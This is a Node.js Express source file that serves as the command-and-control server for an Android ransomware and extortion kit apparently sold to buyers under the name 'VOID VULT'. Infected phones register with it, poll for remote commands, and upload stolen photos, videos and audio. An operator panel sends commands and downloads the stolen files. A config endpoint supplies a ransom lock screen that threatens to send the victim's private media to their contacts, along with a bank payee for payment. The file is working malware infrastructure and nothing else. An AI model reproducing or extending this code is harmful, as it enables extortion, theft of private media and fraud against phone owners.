const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json({ limit: '50mb' }));

// ============================================================
//   CONFIG
// ============================================================
// Valid user IDs (buyers get these). Add more as you sell.
const VALID_IDS = [
  "48291", "57394", "12847", "91028", "37654",
  "84021", "62517", "19483", "75062", "30918",
  "57120", "89643", "26307", "41985", "68210",
  "93574", "14758", "52036", "78419", "36142"
];

// ============================================================
//   STORAGE (in-memory — Render restarts will clear)
//   For persistence, upgrade to Postgres later.
// ============================================================
const devices = {};        // { userId: { lastSeen, info, locked } }
const commands = {};       // { userId: [ { cmd, args, id, sentAt } ] }
const results = {};        // { userId: [ { cmd, data, at } ] }
const uploads = {};        // { userId: [ { type, url, at } ] }

const UPLOAD_DIR = '/tmp/void_uploads';
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR);

const upload = multer({ dest: UPLOAD_DIR });

// ============================================================
//   HELPERS
// ============================================================
function validId(id) {
  return VALID_IDS.includes(id);
}

function now() {
  return Date.now();
}

// ============================================================
//   PAYLOAD ENDPOINTS (target phone)
// ============================================================

// Payload checks in every 2s
app.post('/register', (req, res) => {
  const { userId, device, android, battery, network } = req.body;
  if (!validId(userId)) return res.json({ ok: false, err: 'invalid id' });

  devices[userId] = {
    lastSeen: now(),
    device: device || 'unknown',
    android: android || '?',
    battery: battery || '?',
    network: network || '?',
    online: true
  };

  res.json({ ok: true });
});

// Payload polls for commands
app.get('/commands', (req, res) => {
  const userId = req.query.device;
  if (!validId(userId)) return res.json({ ok: false, err: 'invalid id' });

  // Update last seen
  if (devices[userId]) devices[userId].lastSeen = now();
  else devices[userId] = { lastSeen: now(), online: true };

  const cmds = commands[userId] || [];
  commands[userId] = []; // clear after delivery

  res.json({ ok: true, commands: cmds });
});

// Payload posts result
app.post('/result', (req, res) => {
  const { userId, cmdId, cmd, data } = req.body;
  if (!validId(userId)) return res.json({ ok: false });

  if (!results[userId]) results[userId] = [];
  results[userId].push({ cmdId, cmd, data, at: now() });
  if (results[userId].length > 200) results[userId].shift();

  res.json({ ok: true });
});

// Payload uploads file (photo/video/audio/etc)
app.post('/upload', upload.single('file'), (req, res) => {
  const { userId, type } = req.body;
  if (!validId(userId)) return res.json({ ok: false });

  if (!req.file) return res.json({ ok: false, err: 'no file' });

  const finalName = req.file.filename + '_' + (type || 'file');
  const finalPath = path.join(UPLOAD_DIR, finalName);
  fs.renameSync(req.file.path, finalPath);

  if (!uploads[userId]) uploads[userId] = [];
  uploads[userId].push({ type: type || 'file', name: finalName, at: now() });
  if (uploads[userId].length > 100) uploads[userId].shift();

  res.json({ ok: true, name: finalName });
});

// Payload receives config (ransom text, payee info, etc)
app.get('/config', (req, res) => {
  res.json({
    ok: true,
    releaseToken: '129010',
    payee: {
      bank: 'PALMPAY',
      account: '9153239545',
      name: 'TOBILOBA'
    },
    maxTries: 5,
    lockText: 'CONGRATULATIONS, I LOCKED YOUR PHONE\n\nLOCKED BY VOID\n\nYou have 24 hours to pay or I will send everybody in your contact list every picture you took and every video you filmed since the first day you bought this phone.\n\nEverything in your phone is now under my control. Your contacts, pictures, and videos are uploaded to my server and locked with 256-bit encryption.\n\nHERE IS THE DEAL\n\nPay ANY AMOUNT to:'
  });
});

// ============================================================
//   PANEL ENDPOINTS (your control app)
// ============================================================

// Panel login — username VOID, password = userId
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  if (username !== 'VOID') return res.json({ ok: false, err: 'invalid username' });
  if (!validId(password)) return res.json({ ok: false, err: 'invalid id' });

  // Generate a simple session token
  const token = 'void_' + password + '_' + Date.now();

  res.json({ ok: true, token, userId: password });
});

// List all devices
app.get('/devices', (req, res) => {
  const list = Object.keys(devices).map(id => {
    const d = devices[id];
    const online = (now() - d.lastSeen) < 30000; // 30s ago = online
    return {
      userId: id,
      device: d.device,
      android: d.android,
      battery: d.battery,
      network: d.network,
      lastSeen: d.lastSeen,
      online: online
    };
  });
  res.json({ ok: true, devices: list });
});

// Get single device detail
app.get('/device', (req, res) => {
  const id = req.query.id;
  if (!validId(id)) return res.json({ ok: false });
  const d = devices[id] || {};
  const online = d.lastSeen && (now() - d.lastSeen) < 30000;
  res.json({
    ok: true,
    userId: id,
    online: online,
    device: d.device,
    android: d.android,
    battery: d.battery,
    network: d.network,
    lastSeen: d.lastSeen,
    results: results[id] || [],
    uploads: uploads[id] || []
  });
});

// Panel sends a command to a device
app.post('/send', (req, res) => {
  const { userId, cmd, args } = req.body;
  if (!validId(userId)) return res.json({ ok: false });

  if (!commands[userId]) commands[userId] = [];
  const cmdId = 'c_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
  commands[userId].push({ id: cmdId, cmd, args: args || '', sentAt: now() });

  res.json({ ok: true, cmdId });
});

// Panel fetches results
app.get('/results', (req, res) => {
  const userId = req.query.device;
  if (!validId(userId)) return res.json({ ok: false });
  res.json({ ok: true, results: results[userId] || [] });
});

// Download uploaded file
app.get('/file/:name', (req, res) => {
  const filePath = path.join(UPLOAD_DIR, req.params.name);
  if (!fs.existsSync(filePath)) return res.status(404).send('not found');
  res.sendFile(filePath);
});

// Health check
app.get('/', (req, res) => {
  res.send('VOID VULT SERVER ONLINE — ' + new Date().toISOString());
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('VOID VULT listening on ' + PORT);
});
